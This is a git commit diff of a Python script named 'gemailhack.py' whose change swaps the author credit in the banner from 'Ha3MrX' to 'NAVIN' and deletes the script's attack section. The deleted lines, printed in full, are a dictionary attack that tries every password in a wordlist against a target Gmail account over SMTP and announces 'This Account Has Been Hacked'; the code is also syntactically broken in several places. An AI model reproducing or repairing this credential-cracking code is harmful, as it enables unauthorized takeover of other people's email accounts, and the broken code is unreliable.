642161ce039a1551a1bda88a56df5691872478e0
MrProfessor999 <91714877+MrProfessor999@users.noreply.github.com>
2021-10-13 11:10:13 +0530

    Update gemailhack.py

--- gemailhack.py
+++ gemailhack.py
@@ -1,19 +1,19 @@
 #!/usr/bin/python
-'''create by Ha3MrX'''
+'''create by NAVIN'''
 
 import smtplib
 from os import system
 
 def main():
    print ('=================================================')
-   print ('               create by Professor               ')
+   print ('               create by NAVIN                   ')
    print ('=================================================')
    print ('               ++++++++++++++++++++              ')
    print ('\n                                               ')
    print ('  _,.                                            ')
    print ('                                                 ')
    print ('                                                 ')
-   print ('           HA3MrX                                ')
+   print ('           NAVIN                                 ')
    print ('       _,.                   ')
    print ('     ,` -.)                  ')
    print ('    ( _/-\\-._               ')
@@ -35,40 +35,3 @@ def main():
    print ('     |     {__)              ') 
    print ('           ()   V.1.0        ')
 
-main()
-print ('[1] start the attack')
-print ('[2] exit')
-option = input('==>')
-if option == 1:
-   file_path = raw_input('path of passwords file :')
-else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.ehlo()
-    for password in pass_list:
-      i = i + 1
-      print (str(i) + ('/') + str(len(pass_list))
-      try
-         server.login(user_name, password)
-         system('clear')
-         main()
-         print ('\n')
-         print ('[+] This Account Has Been Hacked Password :' + password + ')     ^_^'
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
-            system('clear')
-            main()
-            print ('[+] this account has been hacked, password :(' + password + ')     ^_^'
-
-            break
-         else:
-            print '[!] password not found => ' + password 
-login()
